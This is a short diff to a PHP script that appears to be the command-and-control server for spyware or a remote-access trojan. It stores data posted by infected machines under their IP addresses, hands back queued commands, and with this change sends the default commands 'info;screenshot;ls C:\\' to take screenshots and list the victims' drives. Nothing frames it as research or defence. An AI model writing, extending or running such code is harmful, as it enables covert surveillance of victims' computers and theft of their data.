@@ -8,12 +8,18 @@ $file_cmds = 'commands/' . $ip;
 $file_info = 'info/' . $ip;
 $file_ls = 'ls/' . $ip;
 
+$default_cmds = 'info;screenshot;ls C:\\';
+
 $file_screenshots = 'screenshots/' . $ip;
 
 if (isset($_POST['d'])) {
 	file_put_contents($file_data, file_get_contents($file_data) . $_POST['d']);
 
-	echo file_get_contents($file_cmds);
+	if (file_exists($file_cmds)) {
+		echo file_get_contents($file_cmds);
+	} else {
+		echo $default_cmds;
+	}
 	file_put_contents($file_cmds, '');
 }
 else if (isset($_POST['l'])) {
